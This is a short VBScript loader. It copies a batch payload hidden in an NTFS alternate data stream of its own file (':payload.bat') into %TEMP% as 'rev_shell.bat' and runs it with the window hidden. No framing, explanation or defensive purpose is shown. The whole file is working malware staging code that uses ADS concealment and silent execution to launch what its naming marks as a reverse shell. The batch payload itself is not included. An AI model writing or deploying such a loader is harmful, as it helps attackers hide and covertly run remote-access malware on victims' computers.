Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

tempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\rev_shell.bat"

' Copy ADS to temp file
Set ads = fso.OpenTextFile(WScript.ScriptFullName & ":payload.bat", 1)
Set outFile = fso.CreateTextFile(tempPath, True)
Do Until ads.AtEndOfStream
    outFile.WriteLine ads.ReadLine
Loop
ads.Close
outFile.Close

' Run hidden
shell.Run Chr(34) & tempPath & Chr(34), 0, False
